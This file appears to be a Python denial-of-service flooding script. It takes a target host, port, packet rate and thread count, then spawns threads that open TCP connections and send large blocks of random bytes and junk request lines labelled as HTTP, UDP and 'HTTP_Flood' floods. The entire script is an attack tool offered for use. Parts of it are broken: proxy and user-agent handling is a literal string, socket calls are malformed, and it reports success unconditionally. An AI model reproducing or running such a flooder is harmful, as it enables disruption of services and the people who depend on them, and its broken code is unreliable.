import socket, random, threading, os, argparse, time,useragent

def color_text(text, color):
    colors = {
        'black': '\033[0;30m',
        'red': '\033[0;31m',
        'green': '\033[0;32m',
        'yellow': '\033[0;33m',
        'blue': '\033[0;34m',
        'magenta': '\033[0;35m',
        'cyan': '\033[0;36m',
        'white': '\033[0;37m',
        'bright_black': '\033[1;30m',
        'bright_red': '\033[1;31m',
        'bright_green': '\033[1;32m',
        'bright_yellow': '\033[1;33m',
        'bright_blue': '\033[1;34m',
        'bright_magenta': '\033[1;35m',
        'bright_cyan': '\033[1;36m',
        'bright_white': '\033[1;37m',
        'reset': '\033[0m'
    }
    
    if color in colors:
        return f"{colors[color]}{text}{colors['reset']}"
    else:
        return text


parser = argparse.ArgumentParser()
parser.add_argument("-s", "--target_host", help="Target Host", required=True)
parser.add_argument("-p", "--port", help="Target port", required=True, type=int)
parser.add_argument("-c", "--packets_per_second", help="Packet per detik", required=True, type=int)
parser.add_argument("-th", "--thread", help="Threading", required=True, type=int)
args = parser.parse_args()

host = args.target_host
port = args.port
pack = args.packets_per_second
Trd = args.thread

ua = 'useragent.detect("user_agents.txt")'
fakeip = 'proxy.txt'

try:
    def start():
        hh = random._urandom(99999)
        xx = int(0)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,port))
            s.send(hh)
            for i in range(pack):
                s.send(hh)
            xx += 1
            s.send(("GET /"+host+" HTTP/1.1\r\n\r\n").encode("ascii"), (host, port))
            s.send(("POST /"+host+" POST/1.1\r\n\r\n").encode("ascii"), (host, port))
            s.send(("TCP /"+host+" TCP/1.1\r\n\r\n").encode("ascii"), (host, port))
            s.send(("UDP/"+host+" UDP/1.1\r\n\r\n").encode("ascii"), (host, port))
            s.send(("HTTP /"+host+" HTTP/1.1\r\n\r\n").encode("ascii"), (host, port))
            s.send(("HTTP_Flood /"+host+" HTTP_Flood/1.1\r\n\r\n").encode("ascii"), (host, port))
            s.send(("Layer 2 / Layer 4 Layer 7 /"+host+" Layer 2 / Layer 4 Layer 7/1.1\r\n\r\n").encode("ascii"), (host, port))
            s.send(("Host: "+fakeip+"\r\n\r\n").encode("ascii"), (host, port))
        except:
            s.close()
            print(color_text(f'No connection to {host}', 'red'))
            time.sleep(2)

    for x in range(Trd):
        print(color_text(f'Succesfull Sent {x} Packet To {host} Port {port}', 'bright_blue'))
        thread = threading.Thread(target=start)
        thread.start()
except KeyboardInterrupt:
    exit()
